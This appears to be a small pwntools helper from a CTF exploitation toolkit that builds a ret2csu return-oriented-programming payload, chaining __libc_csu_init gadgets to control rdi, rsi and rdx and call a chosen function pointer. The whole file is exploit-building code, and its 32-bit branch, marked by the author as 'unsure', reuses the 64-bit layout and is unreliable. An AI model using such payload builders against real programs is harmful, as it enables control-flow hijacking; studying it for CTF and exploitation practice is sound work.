# -*- coding:utf-8 -*-
from pwn import *
def csu( ptr2retaddr, rdx, rsi, edi, last_ret,padding,csu_end_addr,csu_front_addr, is32=False,rbx=0, rbp=1):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call(a point like got)
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    # padding is stack padding after call [r12] --> will ret to some addr
    # 想要再次控制rop, [r12] 这个地址至少需要一个pop ret, 那么padding=0即可
    if not is32:
        payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(ptr2retaddr) + p64(rdx) + p64(rsi) + p64(edi)
        payload += p64(csu_front_addr)
        payload += '\xff' * padding
        payload += p64(last_ret)
        return payload
    else:
        # unsure :)
        payload = p32(csu_end_addr) + p32(rbx) + p32(rbp) + p32(ptr2retaddr) + p32(rdx) + p32(rsi) + p32(edi)
        payload += p32(csu_front_addr)
        payload += '\xff' * padding
        payload += p32(last_ret)
        return payload